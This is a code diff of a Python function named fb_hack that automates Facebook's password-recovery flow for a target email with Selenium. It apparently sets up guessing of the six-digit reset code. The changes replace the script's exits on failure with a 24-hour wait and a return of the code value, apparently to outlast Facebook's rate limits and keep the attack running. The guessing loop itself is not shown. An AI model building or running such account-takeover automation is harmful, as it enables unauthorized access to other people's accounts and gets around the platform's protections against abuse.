@@ -45,7 +45,6 @@ def fb_hack(email, codex):
   driver.get("https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l")
   html = driver.page_source
   soup = BeautifulSoup(html, 'html.parser')
-while breaker != 1:
   try:
     search_box = driver.find_element(by = By.ID, value = "identify_email")
     search_box.send_keys(email)
@@ -55,6 +54,9 @@ while breaker != 1:
     sleep(2)
     driver.save_screenshot("fail1.png")
     print("Failed at email")
+    t = 86400
+    countdown(t)
+    return codex
   try:
     search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
     search_button.click()
@@ -63,7 +65,9 @@ while breaker != 1:
     sleep(2)
     driver.save_screenshot("fail2.png")
     print("Failed at try another way")
-    sys.exit()
+    t = 86400
+    countdown(t)
+    return codex
   try:
     search_button = driver.find_element(by = By.NAME, value = "reset_action")
     search_button.click()
@@ -72,7 +76,9 @@ while breaker != 1:
     sleep(2)
     driver.save_screenshot("fail3.png")
     print("Failed at reset action")
-    sys.exit()
+    t = 86400
+    countdown(t)
+    return codex
   counter = 0
   test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
